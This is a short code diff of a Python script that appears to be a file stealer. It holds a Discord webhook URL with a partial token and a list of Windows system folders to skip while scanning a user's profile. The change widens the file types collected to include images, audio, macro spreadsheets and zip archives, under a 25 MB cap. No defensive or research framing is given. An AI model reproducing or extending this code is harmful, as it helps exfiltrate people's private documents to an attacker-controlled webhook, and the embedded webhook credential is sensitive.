@@ -27,7 +27,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1183181478645997698/bmS94RKPMhnf
 BLACKLISTED_DIRS = ['C:\\Windows\\', os.path.normpath(r"%s\AppData"%(os.environ['USERPROFILE'])), os.path.normpath(r"%s\OneDrive\Documents"%(os.environ['USERPROFILE'])), 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\PerfLogs\\', 'C:\\ProgramData\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\AMD\\', 'C:\\XboxGames\\', 'C:\\Users\\Default\\', 'C:\\Users\\defaultuser100000\\', 'C:\\Users\\Public\\', os.path.normpath(r"%s\3D Objects"%(os.environ['USERPROFILE'])), os.path.normpath(r"%s\Contacts"%(os.environ['USERPROFILE'])), os.path.normpath(r"%s\Favorites"%(os.environ['USERPROFILE'])), os.path.normpath(r"%s\Microsoft"%(os.environ['USERPROFILE'])), os.path.normpath(r"%s\Music"%(os.environ['USERPROFILE'])), os.path.normpath(r"%s\OneDrive\Documents"%(os.environ['USERPROFILE'])), os.path.normpath(r"%s\Saved Games"%(os.environ['USERPROFILE'])), os.path.normpath(r"%s\Searches"%(os.environ['USERPROFILE'])), os.path.normpath(r"%s\Tracing"%(os.environ['USERPROFILE'])), os.path.normpath(r"%s\NTUSER.DAT"%(os.environ['USERPROFILE'])), os.path.normpath(r"%s\.thinkorswim"%(os.environ['USERPROFILE']))]
 MAX_FILE_SIZE_MB = 25
 def check_file(file_path):
-    allowed_extensions = ['.pdf', '.docx', '.xls', '.xlsx', '.docx', '.csv']
+    allowed_extensions = ['.pdf', '.docx', '.xls', '.xlsx', '.docx', '.csv', '.pptx', '.xlsm', '.png', '.jpg', '.jpeg', '.wav', '.zip']
     max_size_mb = 25
     if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
         print(f"Skipping file {file_path} - invalid file type")
